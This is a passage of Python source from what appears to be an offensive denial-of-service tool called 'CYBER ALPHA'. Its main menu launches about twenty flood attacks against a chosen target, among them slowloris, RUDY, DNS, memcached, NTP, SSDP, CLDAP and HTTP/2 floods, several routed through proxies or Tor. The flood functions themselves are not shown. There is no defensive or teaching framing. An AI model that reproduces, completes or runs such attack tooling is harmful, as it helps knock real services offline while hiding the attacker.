                asyncio.run(search_flood(target, path, duration, threads, rate, proxy, use_tor))
            elif choice == 5:
                threading.Thread(target=slowloris_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 6:
                threading.Thread(target=rudy_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 7:
                threading.Thread(target=dns_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 8:
                threading.Thread(target=icmp_flood, args=(target, duration, threads, rate)).start()
            elif choice == 9:
                threading.Thread(target=memcached_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 10:
                threading.Thread(target=ntp_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 11:
                threading.Thread(target=snmp_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 12:
                threading.Thread(target=ldap_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 13:
                threading.Thread(target=cldap_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 14:
                threading.Thread(target=ssdp_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 15:
                threading.Thread(target=sip_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 16:
                threading.Thread(target=gre_flood, args=(target, duration, threads, rate)).start()
            elif choice == 17:
                asyncio.run(websocket_flood(target, path, duration, threads, rate, proxy, use_tor))
            elif choice == 18:
                asyncio.run(http2_flood(target, path, duration, threads, rate, proxy, use_tor))
            elif choice == 19:
                apocalypse_x(target, path, duration, threads, rate, proxy, use_tor)
            input(f"{RED}[CYBER ALPHA] Attack completed. Press Enter to continue...{RESET}")
    except ValueError as e:
        log_message(f"Invalid input: {str(e)}")
        print(f"{RED}[CYBER ALPHA] Invalid input. Exiting...{RESET}")

if __name__ == "__main__":
    main()
